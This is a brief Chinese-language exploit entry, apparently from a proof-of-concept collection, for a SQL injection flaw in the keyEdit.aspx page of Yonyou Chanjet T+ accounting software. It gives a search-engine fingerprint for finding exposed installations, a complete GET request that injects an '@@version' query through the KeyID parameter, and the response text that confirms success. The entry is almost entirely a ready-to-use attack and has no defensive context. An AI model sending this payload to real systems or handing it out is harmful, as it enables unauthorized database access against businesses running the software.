# 用友畅捷通keyEdit.aspxSQL注入

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`GET /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1`
- **响应特征**：200 nvarchar